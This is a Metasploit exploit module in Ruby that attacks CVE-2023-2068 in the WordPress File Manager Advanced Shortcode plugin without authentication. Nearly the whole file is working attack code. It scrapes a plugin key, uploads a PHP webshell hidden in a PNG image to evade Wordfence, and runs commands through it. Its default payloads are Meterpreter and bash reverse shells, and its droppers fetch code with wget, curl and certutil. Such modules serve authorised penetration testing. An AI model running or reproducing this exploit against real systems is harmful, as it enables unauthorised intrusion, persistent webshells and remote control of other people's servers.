##
# This module requires Metasploit: https://metasploit.com/download
# Current source: https://github.com/rapid7/metasploit-framework
##

require 'msf/core/exploit/powershell'

class MetasploitModule < Msf::Exploit::Remote
  Rank = ExcellentRanking

  include Msf::Exploit::Remote::HttpClient
  include Msf::Exploit::CmdStager
  include Msf::Exploit::FileDropper
  include Msf::Exploit::Powershell
  include Msf::Exploit::Format::PhpPayloadPng
  prepend Msf::Exploit::Remote::AutoCheck

  def initialize(info = {})
    super(
      update_info(
        info,
        'Name' => 'Wordpress File Manager Advanced Shortcode 2.3.2 - Unauthenticated Remote Code Execution through shortcode',
        'Description' => %q{
          The Wordpress plugin does not adequately prevent uploading files with disallowed MIME types when using the shortcode.
          This leads to RCE in cases where the allowed MIME type list does not include PHP files.
          In the worst case, this is available to unauthenticated users, but is also works in an authenticated configuration.
          File Manager Advanced Shortcode plugin version `2.3.2` and lower are vulnerable.
          To install the Shortcode plugin File Manager Advanced version `5.0.5` or lower is required to keep the configuration
          vulnerable. Any user privileges can exploit this vulnerability which results in access to the underlying operating system
          with the same privileges under which the Wordpress web services run. 
        },
        'Author' => [
          'h00die-gr3y <h00die.gr3y[at]gmail.com>', # Metasploit module
          'Mateus Machado Tesser' # discovery
        ],
        'References' => [
          ['CVE', '2023-2068'],
          ['URL', 'https://attackerkb.com/topics/JncRCWZ5xm/cve-2023-2068'],
          ['PACKETSTORM', '172707'],
          ['WPVDB', '58f72953-56d2-4d86-a49b-311b5fc58056']
        ],
        'License' => MSF_LICENSE,
        'Platform' => ['windows', 'unix', 'linux', 'php'],
        'Privileged' => false,
        'Arch' => [ARCH_CMD, ARCH_PHP, ARCH_X64, ARCH_X86, ARCH_AARCH64],
        'Targets' => [
          [
            'PHP',
            {
              'Platform' => 'php',
              'Arch' => ARCH_PHP,
              'Type' => :php,
              'DefaultOptions' => {
                'PAYLOAD' => 'php/meterpreter/reverse_tcp'
              }
            }
          ],
          [
            'Unix Command',
            {
              'Platform' => 'unix',
              'Arch' => ARCH_CMD,
              'Type' => :unix_cmd,
              'DefaultOptions' => {
                'PAYLOAD' => 'cmd/unix/reverse_bash'
              }
            }
          ],
          [
            'Linux Dropper',
            {
              'Platform' => 'linux',
              'Arch' => [ARCH_X64, ARCH_X86, ARCH_AARCH64],
              'Type' => :linux_dropper,
              'Space' => 65535,
              'CmdStagerFlavor' => ['wget', 'curl', 'printf', 'bourne'],
              'DefaultOptions' => {
                'PAYLOAD' => 'linux/x64/meterpreter/reverse_tcp'
              }
            }
          ],
          [
            'Windows Command',
            {
              'Platform' => 'win',
              'Arch' => ARCH_CMD,
              'Type' => :windows_cmd,
              'DefaultOptions' => {
                'PAYLOAD' => 'cmd/windows/powershell/x64/meterpreter/reverse_tcp'
              }
            }
          ],
          [
            'Windows Powershell',
            {
              'Platform' => 'win',
              'Arch' => [ARCH_X64, ARCH_X86],
              'Type' => :windows_powershell,
              'DefaultOptions' => {
                'PAYLOAD' => 'windows/x64/meterpreter/reverse_tcp'
              }
            }
          ],
          [
            'Windows Dropper',
            {
              'Platform' => 'win',
              'Arch' => [ARCH_X64, ARCH_X86],
              'Type' => :windows_dropper,
              'Space' => 3000,
              'CmdStagerFlavor' => ['psh_invokewebrequest', 'vbs', 'debug_asm', 'debug_write', 'certutil'],
              'DefaultOptions' => {
                'PAYLOAD' => 'windows/x64/meterpreter/reverse_tcp'
              }
            }
          ]
        ],
        'DefaultTarget' => 0,
        'DisclosureDate' => '2023-05-31',
        'DefaultOptions' => {
          'SSL' => false,
          'RPORT' => 80
        },
        'Notes' => {
          'Stability' => [CRASH_SAFE],
          'SideEffects' => [ARTIFACTS_ON_DISK, IOC_IN_LOGS],
          'Reliability' => [REPEATABLE_SESSION]
        }
      )
    )
    register_options(
      [
        OptString.new('TARGETURI', [true, 'File Manager Advanced (FMA) Shortcode URI path', '/']),
        OptString.new('WEBSHELL', [
          false, 'The name of the webshell with extension php. Webshell name will be randomly generated if left unset.', nil
        ]),
        OptEnum.new('COMMAND',
                    [true, 'Use PHP command function', 'passthru', %w[passthru shell_exec system exec]], conditions: %w[TARGET != 0])
      ]
    )
  end

  def get_form_data(png_webshell)
    # construct multipart form data
    form_data = Rex::MIME::Message.new
    form_data.add_part('', nil, nil, 'form-data; name="reqid"')
    form_data.add_part('upload', nil, nil, 'form-data; name="cmd"')
    form_data.add_part('l1_Lw', nil, nil, 'form-data; name="target"')
    form_data.add_part('fma_load_shortcode_fma_ui', nil, nil, 'form-data; name="action"')
    form_data.add_part(@wp_data['fmakey'].to_s, nil, nil, 'form-data; name="_fmakey"')
    form_data.add_part(@upload_path.to_s, nil, nil, 'form-data; name="path"')
    form_data.add_part('', nil, nil, 'form-data; name="url"')
    form_data.add_part('false', nil, nil, 'form-data; name="w"')
    form_data.add_part('true', nil, nil, 'form-data; name="r"')
    form_data.add_part('plugins', nil, nil, 'form-data; name="hide"')
    form_data.add_part('upload,download', nil, nil, 'form-data; name="operations"')
    form_data.add_part('inside', nil, nil, 'form-data; name="path_type"')
    form_data.add_part('no', nil, nil, 'form-data; name="hide_path"')
    form_data.add_part('no', nil, nil, 'form-data; name="enable_trash"')
    form_data.add_part('image/png,text/x-php', nil, nil, 'form-data; name="upload_allow"')
    form_data.add_part('2G', nil, nil, 'form-data; name="upload_max_size"')
    form_data.add_part(png_webshell.to_s, 'image/png, text/x-php', 'binary', "form-data; name=\"upload[]\"; filename=\"#{@webshell_name}\"")
    form_data.add_part('', nil, nil, 'form-data; name="mtime[]"')
    return form_data
  end

  def upload_webshell
    # randomize file name if option WEBSHELL is not set
    @webshell_name = (datastore['WEBSHELL'].blank? ? "#{Rex::Text.rand_text_alpha(8..16)}.php" : datastore['WEBSHELL'].to_s)

    @post_param = Rex::Text.rand_text_alphanumeric(1..8)
    @get_param = Rex::Text.rand_text_alphanumeric(1..8)

    payload = if target['Type'] == :php
                "<?php @eval(base64_decode($_POST[\'#{@post_param}\']));?>"
              else
                "<?=$_GET[\'#{@get_param}\'](base64_decode($_POST[\'#{@post_param}\']));?>"
              end

    # inject PHP payload into the PLTE chunk of the PNG image to bypass security such as Wordfence
    png_webshell = inject_php_payload_png(payload, injection_method: 'PLTE')
    if png_webshell.nil?
      return false
    end

    # Upload payload in Wordpress root for execution
    # try again at the configured upload directory if LFI fails
    @upload_path = ''
    no_break = true
    loop do
      form_data = get_form_data(png_webshell)
      res = send_request_cgi({
        'method' => 'POST',
        'uri' => normalize_uri('/', @wp_data['baseurl'], 'wp-admin', 'admin-ajax.php'),
        'ctype' => "multipart/form-data; boundary=#{form_data.bound}",
        'data' => form_data.to_s
      })
      if res && res.code == 200 && !res.body.blank?
        # parse json to find the webshell name embedded in the response at the "added" section that indicates a successful upload
        res_json = res.get_json_document
        return false if res_json.blank?
        return true if res_json.dig('added', 0, 'name') == @webshell_name

        # If we face an upload permission error, use the configured upload directory path to upload the payload
        # We might not have execution rights there, but at least we can try ;-)
        if res_json.dig('warning', 0) == 'errUploadFile' && res_json.dig('warning', 2) == 'errPerm' && no_break
          @upload_path = @wp_data['path']
          no_break = false
        else
          return false
        end
      else
        return false
      end
    end
  end

  def execute_php(cmd, _opts = {})
    payload = Base64.strict_encode64(cmd)
    send_request_cgi({
      'method' => 'POST',
      'uri' => normalize_uri('/', @wp_data['baseurl'], @upload_path, @webshell_name),
      'ctype' => 'application/x-www-form-urlencoded',
      'vars_post' => {
        @post_param => payload
      }
    })
  end

  def execute_command(cmd, _opts = {})
    payload = Base64.strict_encode64(cmd)
    php_cmd_function = datastore['COMMAND']
    send_request_cgi({
      'method' => 'POST',
      'uri' => normalize_uri('/', @wp_data['baseurl'], @upload_path, @webshell_name),
      'ctype' => 'application/x-www-form-urlencoded',
      'vars_get' => {
        @get_param => php_cmd_function
      },
      'vars_post' => {
        @post_param => payload
      }
    })
  end

  def check_fma_shortcode_plugin
    # check if fma shortcode plugin is installed and return fmakey, upload directory path and Wordpress base url
    @wp_data = {}
    res = send_request_cgi!({
      'method' => 'GET',
      'uri' => normalize_uri(datastore['TARGETURI'])
    })
    if res && res.body && res.code == 200
      # 1. Get the fmakey information by searching for strings:
      # /_fmakey: '1555ef603c',/ or /_fmakey:'1555ef603c',/ or /"fmakey":"1555ef603c",/
      fmakey_match1 = res.body.match(/_fmakey:.*'.*',/)
      fmakey_match2 = res.body.match(/"fmakey":".*",/)
      return if fmakey_match1.nil? && fmakey_match2.nil?

      if fmakey_match1
        @wp_data['fmakey'] = fmakey_match1[0].split(',')[0].split(':')[1].tr('\'', '').strip
      else
        @wp_data['fmakey'] = fmakey_match2[0].split(',')[0].split(':')[1].tr('"', '').strip
      end

      # 2. Get the upload directory path information by searching for strings:
      # /path: 'upload',/ or /path:'upload',/ or /"path":"upload",/
      path_match1 = res.body.match(/path:.*'.*',/)
      path_match2 = res.body.match(/"path":".*",/)
      return if path_match1.nil? && path_match2.nil?

      if path_match1
        @wp_data['path'] = path_match1[0].split(',')[0].split(':')[1].tr('\'', '').strip
      else
        @wp_data['path'] = path_match2[0].split(',')[0].split(':')[1].tr('"', '').strip
      end
      print_status("path: #{@wp_data['path']}")

      # 3. Determine Wordpress baseurl
      # search in html content for:
      # <script src='http(s)://ip/<wp-base>/wp-content/plugins/file-manager-advanced-shortcode/js/shortcode.js?ver=6.2.2' id='fma-shortcode-js-js'></script>
      # split off /wp-content and http(s)://ip part to determine the <wp-base> which can be empty.
      baseurl_match = res.body.match(%r{src=.*wp-content/plugins/file-manager-advanced-shortcode/})
      return if baseurl_match.nil?

      @wp_data['baseurl'] = baseurl_match[0].split('/wp-content')[0].split('/')[3]
      print_status("base_url: #{@wp_data['baseurl']}")
    end
  end

  def check
    check_fma_shortcode_plugin
    return CheckCode::Safe("Could not find fmakey. Shortcode plugin not installed or check your TARGETURI \"#{datastore['TARGETURI']}\" setting.") if @wp_data['fmakey'].nil?

    CheckCode::Appears("fmakey successfully retrieved: #{@wp_data['fmakey']}")
  end

  def exploit
    # check if fmakey is already set from the check method otherwise try to find the key.
    check_fma_shortcode_plugin unless datastore['AutoCheck']
    fail_with(Failure::NotVulnerable, "Could not find fmakey. Shortcode plugin not installed or check your TARGETURI \"#{datastore['TARGETURI']}\" setting.") if @wp_data['fmakey'].nil?

    fail_with(Failure::NotVulnerable, "Webshell #{@webshell_name} upload failed.") unless upload_webshell
    register_file_for_cleanup(@webshell_name.to_s)

    print_status("Executing #{target.name} for #{datastore['PAYLOAD']}")
    case target['Type']
    when :php
      execute_php(payload.encoded)
    when :unix_cmd, :windows_cmd
      execute_command(payload.encoded)
    when :linux_dropper, :windows_dropper
      execute_cmdstager({ linemax: target.opts['Space'] })
    when :windows_powershell
      execute_command(cmd_psh_payload(payload.encoded, payload.arch.first, remove_comspec: true))
    end
  end
end
